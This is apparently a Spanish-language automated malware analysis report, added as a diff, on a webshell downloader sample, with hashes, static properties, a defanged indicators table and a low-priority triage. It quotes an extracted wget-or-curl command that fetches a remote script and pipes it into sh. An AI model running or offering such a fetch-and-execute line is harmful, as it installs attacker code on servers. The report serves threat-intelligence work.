@@ -1,0 +1,75 @@
+# 🧬 Payload Analysis
+
+`8fa8d688b127fb95710925c19269630df0aececff9a17ab6bec5e0874a43cc5c`
+
+## 📌 Resumen
+
+Artefacto asociado a la familia **webshell** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.
+
+## 🏷️ Clasificación
+
+- **Categoría:** `Downloader / Dropper`
+- **Familia:** `webshell`
+- **Confianza de familia:** `Media`
+- **Riesgo:** `Critical`
+
+## 🗓️ Registro
+
+- **Registrado:** `2026-08-09T20:24:57+00:00`
+- **Tipo de registro:** `snapshot inmutable`
+
+## 🔐 Identidad
+
+- **SHA256:** `8fa8d688b127fb95710925c19269630df0aececff9a17ab6bec5e0874a43cc5c`
+- **SHA1:** `494ee3b0e219f5247373b48ab1dcb46b0ed397f9`
+- **MD5:** `020e9bc3fc75171ca8ccd83e36e8d9a6`
+
+## 🧪 Análisis estático
+
+| Propiedad | Resultado |
+| --- | --- |
+| Descripción | ASCII text, with very long lines (324), with CRLF line terminators |
+| Tamaño | 4.0 KiB |
+| Entropía | 5.6 |
+| Strings | 101 |
+
+## 🧠 Comportamiento observado
+
+1. **Descarga remota**
+2. **Ejecución**
+
+## 🔬 Evidencia de clasificación
+
+- Capacidad detectada: Descarga remota
+- Motivos técnicos: mime=ASCII text, with very long lines (324), with CRLF line terminators; strings=101; iocs=6
+
+## 🖥️ Comandos observados / extraídos
+
+```text
+(wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh || curl -sk hxxps://217.60.195.XXX/sh) | sh -s apache.selfre
+```
+
+## 🌐 Indicadores
+
+| Tipo | Valor | Contexto |
+| --- | --- | --- |
+| ip | 190.179.128.XXX | static_analysis |
+| ip | 217.60.195.XXX | static_analysis |
+| url | hxxps://217.60.195.XXX/sh | strings |
+| url | hxxps://217.60.195.XXX/sh) | strings |
+| hash | 8fa8d688b127fb95710925c19269630df0aececff9a17ab6bec5e0874a43cc5c | static_analysis |
+| command | (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh \|\| curl -sk hxxps://217.60.195.XXX/sh) \| sh -s apache.selfre | strings |
+| ip | 212.127.90.XXX | artifact_source |
+
+## 🔎 Triage
+
+| Campo | Valor |
+| --- | --- |
+| Categoría | low interest unknown |
+| Prioridad | low |
+
+## 🛡️ Nota de publicación
+
+Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.
+
+Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
